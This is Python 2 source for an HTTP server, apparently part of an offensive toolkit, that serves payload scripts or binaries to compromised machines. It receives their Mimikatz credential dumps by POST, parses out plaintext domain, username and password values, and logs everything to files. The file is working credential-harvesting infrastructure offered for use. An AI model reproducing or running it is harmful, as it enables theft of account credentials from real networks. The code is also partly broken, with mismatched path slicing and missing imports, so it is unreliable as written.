from BaseHTTPServer import BaseHTTPRequestHandler
from core.utils import shutdown
from core.logger import *
from datetime import datetime

class MimikatzServer(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path[5:] in os.listdir('hosted'):
            self.send_response(200)
            self.end_headers()
            with open('hosted/'+ self.path[4:], 'r') as script:
                self.wfile.write(script.read())

        elif args.path:
            if self.path[6:] == args.path.split('/')[-1]:
                self.send_response(200)
                self.end_headers()
                with open(args.path, 'rb') as rbin:
                    self.wfile.write(rbin.read())

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers.getheader('content-length'))
        data = self.rfile.read(length)

        if args.mimikatz:
            buf = StringIO.StringIO(data).readlines()
            i = 0
            while i < len(buf):
                if ('Password' in buf[i]) and ('(null)' not in buf[i]):
                    passw  = buf[i].split(':')[1].strip()
                    if len(passw) != 719:
                        domain = buf[i-1].split(':')[1].strip()
                        user   = buf[i-2].split(':')[1].strip()
                        print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
                i += 1

        elif args.mimi_cmd:
            print data

        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
        with open('logs/' + log_name, 'w') as creds:
            creds.write(data)
        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))